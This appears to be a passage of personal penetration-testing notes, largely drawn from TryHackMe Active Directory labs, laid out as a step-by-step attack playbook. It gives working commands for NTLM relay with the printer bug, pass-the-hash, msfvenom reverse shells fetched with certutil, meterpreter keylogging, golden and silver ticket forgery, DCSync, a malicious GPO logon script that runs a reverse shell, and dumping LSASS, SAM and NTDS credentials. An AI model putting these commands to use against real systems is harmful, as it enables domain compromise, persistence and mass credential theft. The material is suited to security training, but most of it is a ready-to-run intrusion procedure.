Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.

### ==🟢Exploitation

#### Exploiting Permission Delegation

ssh into initial user:
```
ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
```
start PowerShell 
```
powershell
```
###### AddMember (Generic write)
```
Add-ADGroupMember "IT Support" -Members "max.smith"
```
check if you are added to the group or not
```
net group "IT Support" /domain
```
you should see your username here 
###### ForceChangePassword
now to get the usernames of all the people in the tier2 admins
```
Get-ADGroupMember -Identity "Tier 2 Admins"
```
select one username 

choose a new password and enter in a variable
```
$Password = ConvertTo-SecureString "<New.Password.For.User>" -AsPlainText -Force 
```
set it as new password 
```
Set-ADAccountPassword -Identity "<AD.Account.Username.Of.Target>" -Reset -NewPassword $Password
```

Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run `gpupdate /force` and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
```
gpupdate /force
```

now login into the new username with the new password we had set

#### Exploiting Automated Relays

In bloodhound query section (CYPHER) run : 
This query will attempt to find instances where a computer has the "AdminTo" relationship over another computer.
```
`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
```
here, server 2 is admin on server 1


now well use The Printer Bug 
for that , first we need to check if these 2 conditions are met or not : 
1. if the Print Spooler service is running on the final target machine 
run in PowerShell : 
```
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
or
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```
2. SMB signing should not be enforced
on both the targets
```
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```
both should be `Message signing enabled but not required`


now the exploit : 
Exploiting Authentication Relays
on kali , start server : 
put ip of server 1 here
```
impacket-ntlmrelayx -smb2support -t smb://<SERVER1 IP> -debug
```

now on our first machine which we have access of :
https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe
```
.\SpoolSample.exe THMSERVER2.za.tryhackme.loc <kali ip on which server is running>
```
SpoolSample triggers this computer to authenticate to your Kali machine as `THMSERVER2$`.

`ntlmrelayx` receives the authentication attempt and forwards it to THMSERVER1.
Accepts the relayed authentication if the conditions are met, potentially allowing administrative actions.

on our relay server we get hashesh for admin 
```
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
```
from here our ntlm hash is the last one
```
3279a0c6dfe15dc3fb6e9c26dd9b066c
```
now we login to the server 
```
impacket-psexec ServerAdmin@thmserver1.za.tryhackme.loc -hashes :3279a0c6dfe15dc3fb6e9c26dd9b066c
```
we get shell 

#### Exploiting AD Users (post-exploitation)

if you already have administrative access to `THMSERVER1`, but now you want to obtain a user's credentials

then introduce two techniques:
- Credential hunting: Searching for files that contain stored credentials. (Locate a KeePass database `.kdbx` file in a user's directories.)
- Keylogging: Capturing a user's keystrokes while they interact with the machine.


make a reverse shell 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=4444 -f exe -o shell.exe
```
now transfer it to server1 where we had NT AUTHORITY\SYSTEM
```
python -m http.server 80
certutil.exe -urlcache -split -f http://10.150.72.11/shell.exe shell.exe
```
now on kali start listener (dont change anything here)
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT 4444; exploit"
```

now run shell.exe on the server1 where we had NT AUTHORITY\SYSTEM
```
.\shell.exe
```
we got a shell back 
```
meterpreter > 
```

we enumerate now to find a keypass database
```
C:\Users\Administrator.ZA> cd C:\Users\trevor.local\Documents
C:\Users\trevor.local\Documents> dir
```
we find a `PasswordDatabase.kdbx` here
now see if the file explorer is running
```
meterpreter > ps | grep explorer
Filtering on 'explorer'
Process List
============
 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 3816  3768  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
```
migrate to the explorer process of trevor.local
```
meterpreter > migrate 3816
[*] Migrating from 32 to 3816...
[*] Migration completed successfully.
```
we start a keylogger
```
meterpreter > keyscan_start
```
and after some time dump it
```
meterpreter > keyscan_dump
```
we get password dumped for the database

now open the database and enter the password
transfer the database to kali
sudo apt install keepassx
```
keepassxc PasswordDatabase.kdbx
```
we enter password dumpted

If we get error : no nothing from keylogger : 
Gain access to the SERVER1 and establish a meterpreter session
Reset the password of the user trevor.local
```
net user trevor.local Password@123
```
RDP with trevor.local to SERVER1
```
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:trevor.local /p:Password@123 /cert:ignore /dynamic-resolution
```
From the meterpreter session, migrate to the explorer process of trevor.local
Back to the RDP session, logged in as trevor.local, run the two script found in Documents folder and the executable on the Desktop.
It might take some time to work (p.s. I am not sure which of the three files does the trick, hence I executed all of them)
Back on meterpreter shell, check to see if credentials were dumped

#### Exploiting Group Policy Objects (GPOs)

1. In BloodHound, find `svcServMan` and identify its owned GPO.
2. Confirm the GPO applies to `THMSERVER2`.

RDP into THMWRK1
```bash
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:svcServman /p:'Sup3rStr0ngPass\!@' /cert:ignore /dynamic-resolution
```

Open CMD → Launch MMC
```cmd
mmc
```

Add snap-in: File → Add/Remove Snap-in → Group Policy Management → Add → OK

Navigate to GPO: 
Servers → Management Servers → Management Server Pushes → Right-click → Edit

Configure Restricted Groups:
Computer Configuration → Policies → Windows Settings → Security Settings → Restricted Groups → Add Group → `IT Support` → Check Names → OK

Under This group is a member of, add:
- `Administrators`
- `Remote Desktop Users`
Click Apply → OK and wait for the policy to apply.

RDP into THMSERVER2
```bash
xfreerdp /v:thmserver2.za.tryhackme.loc /u:lorraine.gill /p:'Tqeq5262' /cert:ignore /smart-sizing
```
Verify group membership
```cmd
whoami /groups
```

### ==🟢Persistence (Post DC exploitation)==

==🔴ALL THESE STEPS ONLY AFTER YOU HAVE GOT DOMAIN ADMIN 
i.e DOMAIN CONTROLLER AS NT AUTHORITY\SYSTEM==
#### ==🔵Golden Ticket==

on our kali attacker machine : 
```
cd /usr/share/doc/python3-impacket/examples
```

to get the `Primary Dns Suffix` : 
`target_ip` = domain controller ip
```
python3 wmiexec.py domain/username:password@target_ip ipconfig /all
```

to get domain SID
```
python3 lookupsid.py <Primary Dns Suffix we got>/<username of user>:<Password of user>@<DC IP>
```

now we need `krbtgt` NT hash 
```
python3 secretsdump.py <Primary Dns Suffix>/<username>:<Password>@<DC IP> -just-dc-user krbtgt
```
well use only the NT hash from here ; which is the last one (krbtgt:)

now we will make the golden ticket
```
sudo python3 ticketer.py -domain <Primary Dns Suffix> -domain-sid S-1-5-21-15098949982252412482-3710614348 -nthash a7f6607449f2621e1adf437eaf6b2397 Administrator
```

now we need to inject this ticket into the memory LSASS
```
export KRB5CCNAME=Administrator.ccache
```

add the dc ip and dc hostname
```
gedit /etc/hosts
```

now interact with the domain without authentication
```
python3 wmiexec.py -k -no-pass -dc-ip <DC IP> <DC HOSTNAME> <command to run ex.whoami>
```
we got access of domain controller 
it doesn't even check if the username we are impersonating even exists or not 
Mitigations: Change the krbtgt account password TWICE. 

#### ==🔵Credentials Dump of all accounts (DCSync)==

==🔴Requirements : You need domain admin credentials/domain admin access beforehand==

DCSync is an attack that tricks Active Directory into sharing password hashes by pretending to be a Domain Controller (DC) performing replication.

run mimikatz
```
.\mimikatz.exe 
```

to have mimikatz store everything we do in this file
```
log sample.txt
```

choose a username to dump the credentials of 
```
lsadump::dcsync /user:<username>
# lsadump::dcsync /domain:za.tryhackme.loc /user:<username>
```
if we have to do it for all the users : 
```
lsadump::dcsync /all
```

if we exit and see the contents to the file we saved it to :
```
mimikatz # exit
dir 
sample.txt
```

now we can transfer it back to our attacker machine kali  so save a copy of the users credentials
Kali:
```bash
sudo systemctl start ssh
```
Windows PowerShell:
```powershell
scp C:\path\to\file.txt kali@<KALI_IP>:/home/kali/
```

find a value
```
cat sample2.txt | grep "krbtgt" -C 10
#print 10 line before and after as well
```

#### ==🔵Silver and Golden Tickets==

==🔴we need admin to run mimikatz==

command for both golden tickets and silver ticket is same
just note that in silver ticket , it has a parameter for a service name
but golden ticket doesn't has a service parameter

==🔴if SID and hashes not available , do first the earlier method of `DCSync`==
##### Golden Tickets : 

```
.\mimikatz.exe 
```

from our dcsync , we has the SID of domain , and ntlm hash of `krbtgt`
```
cat sample2.txt | grep krbtgt -C 10
SAM Username         : krbtgt
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502
Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
```
only this part : 
```
S-1-5-21-3885271727-2693558621-2658995185
```
not the 502 in last 

Once Mimikatz is loaded, perform the following to generate a golden ticket:
change /domain , /sid , /krbtgt
```markup
mimikatz # kerberos::golden /admin:Administrator /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /ptt
```

our Golden ticket has been generated
to list all generated tickets : 
```
exit
klist
```
now we can give any command impersonating as domain controller and we don't have to do any authentication , it will happen automatically through our golden ticket

##### Silver Tickets :

```
.\mimikatz.exe
```

Mimikatz command to generate a silver ticket:
change /domain , /sid , /target (server name is ending with $) , /rc4 ( $ in end)
```markup
mimikatz # kerberos::golden /admin:Administrator /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
our silver ticket is made

```
exit
klist
```

#### ==🔵Abusing GPOs==

we have to make 2 things 
1. reverse shell which will give callback to our listener
2. bat file which is a logon script

make reverse shell 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > kali_shell.exe
```

now make a bat file : this is our logon script 
```
gedit kali_script.bat
```

in this , paste : 
```
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\kali_shell.exe C:\tmp\kali_shell.exe && timeout /t 20 && C:\tmp\kali_shell.exe
```
here m sysvol is the shared folder
and this is the logon script which ill paste there
so whenever the user will login my  reverse shell from `za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\kali_shell.exe` will be copied to `C:\tmp\kali_shell.exe` anf then waut 20 second and then exeucte the reverse shell

We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
copy reverse shell to sysvol
```
scp kali_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```
copy bat file
```
scp kali_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Finally, let's start our MSF listener:
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.

```
xfreerdp /v:THMWRK1.za.tryhackme.loc /u:administrator /p:tryhackmewouldnotguess1@ /workarea /cert:ignore /smart-sizing
```

GPO Creation  

The first step uses our Domain Admin account to open the Group Policy Management snap-in:
1. open cmd, type MMC and press enter.
2. Click on **File**->**Add/Remove Snap-in...**
3. Select the **Group Policy Management** snap-in and click **Add**
4. Click **OK**

now in our domain , select admin and "create a gpo in this domain"
name it 
right click on it and edit

Group Policy Management Editor:  
1. Under User Configuration, expand **Policies->Windows Settings**.
2. Select **Scripts (Logon/Logoff)**.
3. Right-click on **Logon->Properties**
4. Select the **Scripts** tab.
5. Click **Add->Browse**.
Let's navigate to where we stored our Batch and binary files:
on the file explorer search on top , select : 
```
Network > za.tryhackme.loc > SysVol > za.tryhackme.loc > scripts
```
now well wai ttill someone logins as admin 

if lab , simulate a logon as admin 
change the pass of an admin and login

### ==🟢Credential Harvesting==

==🔴YOU NEED TO BE ADMIN FIRST ON A MACHINE==

#### ==🔵Common Windows Locations==

PowerShell commands history file : 
```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

it will give all the "password" strings ; /s for recursively
Local Machine 
```
reg query HKLM /f password /t REG_SZ /s
```

Current User
```
reg query HKCU /f password /t REG_SZ /s
```

enumerate a user : 
switch to powershell 
```
powershell
```
run
```
Get-ADUser -Identity victim -Properties *
```

#### ==🔵Local Windows Credentials==

##### Metasploit's HashDump

using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes.
```
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
```
##### Volume Shadow Copy Service (Method 1 to copy)

open CMD as admin
make a copy of sam and then access it because it is offline file and not in use
```
wmic shadowcopy call create Volume='C:\'
```
to list and confirm that we have a shadow copy
```
vssadmin list shadows
```
The output shows that we have successfully created a shadow copy volume of (C:) with the following path: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`.

Now copy both files (sam and system) from the shadow copy volume we generated to the desktop
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```

now transfer both file to kali using scp
##### Registry Hives (Method 2 to copy)

Copy both files (sam and system) to desktop : 
```shell-session
reg save HKLM\sam C:\users\Administrator\Desktop\sam

reg save HKLM\system C:\users\Administrator\Desktop\system
```

now transfer both file to kali using scp
##### DeCrypt both the sam and system files : 

DeCrypt : 
```
impacket-secretsdump -sam sam -system system LOCAL
```

#### ==🔵Extracting Creds From LSASS Dump==

we will use mimikatz
```
.\mimikatz.exe
privilege::debug
```
run : 
```
mimikatz # sekurlsa::logonpasswords
```

if you get this error : `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` 
Then : 
download `mimidrv.sys` and `mimilib.dll` also to same folder of mimikatz `mimikatz.exe` (https://github.com/ParrotSec/mimikatz/tree/master/x64)

load some drivers in mimikatz which will remove LSA protection from LSASS
```
mimikatz # !+
```
remove protection
```
!processprotect /process:lsass.exe /remove
```
run : 
```
mimikatz # sekurlsa::logonpasswords
```

now you can create LSASS dump file also 
open task manager > details (on top) > find `lsass.exe` > right click > create dump file
it wil be created to C:\Users\thm\AppData\Local\Temp\lsass.DMP
```
cd C:\Users\thm\AppData\Local\Temp\
dir
```
#### ==🔵Windows Credential Manager==
##### Accessing Credential Manager : 

list the current windows vaults available in the Windows target : 
```
vaultcmd /list
```
By default, Windows has two vaults, one for Web and the other one for Windows machine credentials.

check if there are any stored credentials in the Web Credentials vault : 
```
VaultCmd /listproperties:"Web Credentials"
```

The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential : 
```
VaultCmd /listcreds:"Web Credentials"
```
No. `VaultCmd /listcreds:"Web Credentials"` does not reveal the password.
##### Credential Dumping

Use PowerShell Scripts [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)

username and password for accessing the internal application : 
run one by one : 
```
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

##### RunAs

By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.

this will show all the Currently stored credentials:
```
cmdkey /list
```

use runas to execute Windows applications as the `<username>` :
```
runas /savecred /user:THM.red\thm-local cmd.exe
```

##### Mimikatz

```
.\mimikatz.exe
privilege::debug
sekurlsa::credman
```

#### ==🔵Extracting Creds From Domain Controller== 

dump Domain Controller Hashes locally and remotely.
New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc.
##### Local Dumping (No Credentials)

This is usually done if you have no credentials available but have administrator access to the domain controller.

To successfully dump the content of the NTDS file we need the following files:
- C:\Windows\NTDS\ntds.dit
- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\SECURITY

Dumping the content of the NTDS file from the Victim Machine
```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Now, if we check the `c:\temp` directory
```
cd c:\temp
dir
```
we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to Kali

Kali:
```bash
sudo systemctl start ssh
```
For a directory :
```
scp -r "C:\temp\Active Directory" kali@192.168.163.199:/home/kali/Downloads/
scp -r "C:\temp\registry" kali@192.168.163.199:/home/kali/Downloads/
```

Extract hashes from NTDS dumped memory file Locally
```
impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local
```

##### Remote Dumping (With Credentials)(DC Sync)

This is usually done if you have credentials available for for users with administrative access to a domain controller
```
impacket-secretsdump -just-dc THM.red/<AD_Admin_Username>@10.49.178.221
```
it will prompt for entering the password

#### ==🔵Local Administrator Password Solution (LAPS)(low probabilty)== 

The goal is to discover which account is allowed to read the LAPS password and which computer's password it can retrieve.

First, check if LAPS is installed in the machine : 
```
dir "C:\Program Files\LAPS\CSE"
```
Check if `AdmPwd.dll` is present . If yes , next 

find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS i.e which OU has the permission to read the password
switch to powershell
```
Find-AdmPwdExtendedRights -Identity THMorg
```

The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.
```
net groups "THMGroupReader"
```
see the "Members" it has

We found that the `bk-admin` user is a member of `THMGroupReader`
so in order to get the LAPS password, we need to compromise or impersonate the bk-admin user. 

so now we change the password of the user we found out 
open cmd as admin
```
net user <username> <new password> /domain
net user bk-admin Password@123 /domain
```

now we runas (login) into the user
```
runas /user:bk-admin cmd.exe
```

now in the new terminal that opens 
switch to powershell
```
Get-AdmPwdPassword -ComputerName creds-harvestin
```
#### ==🔵AS Rep Roasting== 

first make a list of usernames in 
```
nano users.txt
```

change dc ip and domain name
```
impacket-GetNPUsers -dc-ip 10.48.165.220 thm.red/ -usersfile users.txt
```
we have got the as-rep of one user `victim`

# ==🟣Active Directory NEW==

## 1. Initial Foothold → Normal user access : 

Enumerate the Domain Controller
```
nmap -A -vv -p- -T5 -sC -Pn <DC IP>
```
- **Port 53 (DNS)** — open → confirms this is a DC (DNS running).
- **Port 88 (Kerberos)** — open → Kerberos authentication is active, enabling ticket-based attacks and enumeration.
- **Ports 445 & 139 (SMB)** — open.
- **Port 3389 (RDP)** — open → RDP possible.
- **Ports 389 & 636 (LDAP/LDAPS)** — 389 unencrypted, 636 encrypted (LDAPS). Further confirms the DC role.

We get the domain FQDN:
```
FRIENDS.local
```

also enumerate using : 
```
enum4linux <DC IP>
```
we get hostname of DC i.e `FRIENDS-DC` : 
we get `Domain Name` and `Domain Sid` also : 

we can brute force usernames to find the domain users
Download Kerbrute
```
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64

chmod +x kerbrute_linux_amd64
```
Download Seclists > Usernames > xato-net-10-million-usernames.txt
```
wget https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt
```
run : 
```
./kerbrute_linux_amd64 userenum xato-net-10-million-usernames.txt -d friend.local -t 25 --dc <DC IP>
```
from kerbrute ,we get a valid username 
note down all the usernames ans password you are getting in a file
```
gedit users.txt
```

Scan the client machines (in parallel)
```
nmap -A -vv -p- -T5 -sC -Pn <Machine1 IP>
nmap -A -vv -p- -T5 -sC -Pn <Machine2 IP>
```
from nmap we get the computer name for machine 1 (.130)
```
USERPC2
```
RDP is open on one of the machines 

now we do AS-REP roasting 
AS-REP Roasting happens because some Active Directory accounts have Kerberos pre-authentication disabled.
```
impacket-GetNPUsers -dc-ip <DC IP> -usersfile users.txt FRIENDS.local/
```
Pre-authentication is disabled for `<username>` we get its hash:
Copy the full hash (from `$krb5` to the end) into a file:
crack hash : 
```
john --format=krb5asrep tstark_asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

## 2. Local Privilege Escalation → Local Admin / SYSTEM : 

Map the domain with BloodHound
Instead of transferring `SharpHound.exe` to Windows and shuffling staging files back and forth, use **`bloodhound-python`** — a remote Python ingestor that authenticates, collects the data itself, and brings it back to Kali.
```
https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce
```
Install : 
```
pipx install bloodhound-ce
```
run : 
```
bloodhound-ce-python -u 'USERNAME' -p 'PASSWORD' -c All -d 'thm.red' -ns <DC IP>
```
It finds the computer names (`USERPC1`, `USERPC2`, `FRIENDS-DC`) and the domain name:
```
ls
```
It outputs four JSON files — `computers.json`, `domains.json`, `groups.json`, `users.json` — which we upload into the BloodHound GUI (**Upload Data**).

Find all Domain Admins in BloodHound
Now in in bloodhound analysis , we check which all accounts are keberostable
```
under analysis > kerberos interaction > list all kerberoastable account 
```

`krbtgt` is by default and is present on every domain 
other one  — a custom service account with an SPN set up
We have to do kerberoasting for it
we will click on the user to find its SPN i.e `Service Principal Name`
```
impacket-GetUserSPNs -request -dc-ip <DC IP> friends.local/<username of user>
```
Enter the user's password when prompted. We get the service account's TGS hash:

now we crack the hash 
```
john --format=krb5tgs hello --wordlist=/usr/share/wordlists/rockyou.txt
```

## 3. Lateral Movement → Access another machine :

we now connect to RDP on machine 2 since its RDP port was open : 
```
xfreerdp /v:192.168.29.130 /u:http.server /p:Iloveyou07 /cert:ignore /dynamic-resolution
```

Check local group membership
```
whoami /groups
```

We are a member of the **Administrators** group! Confirm who else is in it:
```
net localgroup Administrators
```
Our user (`<current username`) is listed.

Dump LSASS memory with Mimikatz
now open CMD as admin 
```
.\mimikatz.exe
privelege::debug
```
Dump credentials of currently logged-in users:
```
sekurlsa::logonPasswords
```

now we find credentials of user `<USERNAME>` which is in memory , which is logged in 
We confirm he's a Domain Admin by searching his username in BloodHound:
we copy the NTLM hash 
```
NTLM : 3a2a7de01dfa4cb74a0f3dedcc8c75bd
```

## 4. Domain Privilege Escalation → Gain Domain Admin or compromise the Domain Controller : 

Save the copied hash:
```
gedit newhash
```
Pass the hash against the DC with Impacket's psexec:
```
impacket-psexec <Domain admin username>@<DC IP> -hashes :<NTLM hash>
```
We get **`nt authority\system`** on the Domain Controller.

































